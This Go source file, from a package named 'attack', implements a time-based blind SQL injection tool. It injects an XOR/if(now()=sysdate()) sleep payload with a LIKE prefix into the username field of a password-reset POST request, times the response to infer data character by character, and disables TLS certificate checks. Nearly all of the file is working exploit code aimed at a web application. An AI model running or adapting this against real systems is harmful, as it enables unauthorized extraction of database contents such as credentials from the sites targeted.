package attack

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"time"
)

func (tba *TimeBasedAttack) SendRequest(prefix string) (bool, error) {

	likestr := fmt.Sprintf("%s%%25", prefix)

	sc := tba.sql(likestr, tba.successDelay)

	payload := fmt.Sprintf("0'XOR(if(now()=sysdate(),%s,0))XOR'Z", sc)

	dataStr := fmt.Sprintf("action=newPassword&originalURL=%s&username=%s", originalURL, payload)

	var data = []byte(dataStr)

	start := time.Now()

	err := tba.httpRequest(base_url, "POST", data, headers)

	if err != nil {
		return false, fmt.Errorf("SendRequest(): %w", err)
	}

	elapsed := time.Since(start)

	if elapsed >= time.Duration(tba.successDelay)*time.Second {
		return true, nil
	} else {
		return false, nil
	}

}

func (tba *TimeBasedAttack) httpRequest(targetUrl string, method string, data []byte, headers map[string]string) error {

	request, err := http.NewRequest(method, targetUrl, bytes.NewBuffer(data))

	if err != nil {
		return fmt.Errorf("httpRequest(): %w", err)
	}

	for k, v := range headers {
		request.Header.Set(k, v)
	}

	customTransport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: customTransport,
		Timeout:   20 * time.Second,
	}
	response, err := client.Do(request)

	if err != nil {
		return fmt.Errorf("httpRequest(): %w", err)
	}

	defer response.Body.Close()

	if response.StatusCode != 200 {
		return fmt.Errorf("httpRequest: the api returned a status code: %d | %w", response.StatusCode, err)
	}
	return nil

}
